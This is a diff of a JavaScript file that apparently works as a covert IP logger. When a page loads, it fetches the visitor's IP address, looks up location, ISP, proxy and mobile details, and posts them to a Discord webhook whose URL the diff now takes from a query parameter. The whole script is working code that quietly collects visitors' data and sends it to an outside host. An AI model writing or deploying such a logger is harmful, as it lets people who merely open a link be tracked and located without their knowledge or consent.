@@ -1,17 +1,25 @@
 document.addEventListener("DOMContentLoaded", () => {
+    const urlParams = new URLSearchParams(window.location.search);
+    const webhookURL = urlParams.get("webhook");
+  
+    if (!webhookURL) {
+      console.error("Webhook URL not provided in the query parameter.");
+      return;
+    }
+  
     // Get the user's IP address using a free API
     fetch("https://api64.ipify.org?format=json")
       .then((response) => response.json())
       .then((data) => {
         const userIP = data.ip;
-        fetchIPDetails(userIP);
+        fetchIPDetails(userIP, webhookURL);
       })
       .catch((error) => {
         console.error("Error fetching the user's IP:", error);
       });
   });
   
-  function fetchIPDetails(ipAddress) {
+  function fetchIPDetails(ipAddress, webhookURL) {
     const apiUrl = `http://ip-api.com/php/${ipAddress}?fields=continent,continentCode,country,region,regionName,city,zip,timezone,isp,reverse,mobile,proxy,query`;
   
     fetch(apiUrl)
@@ -37,16 +45,14 @@ document.addEventListener("DOMContentLoaded", () => {
           ],
         };
   
-        sendEmbedToDiscord(embedData);
+        sendEmbedToDiscord(embedData, webhookURL);
       })
       .catch((error) => {
         console.error("Error fetching IP details:", error);
       });
   }
   
-  function sendEmbedToDiscord(embedData) {
-    const webhookURL = "YOUR_DISCORD_WEBHOOK_URL"; // Replace with your actual Discord webhook URL
-  
+  function sendEmbedToDiscord(embedData, webhookURL) {
     fetch(webhookURL, {
       method: "POST",
       headers: {
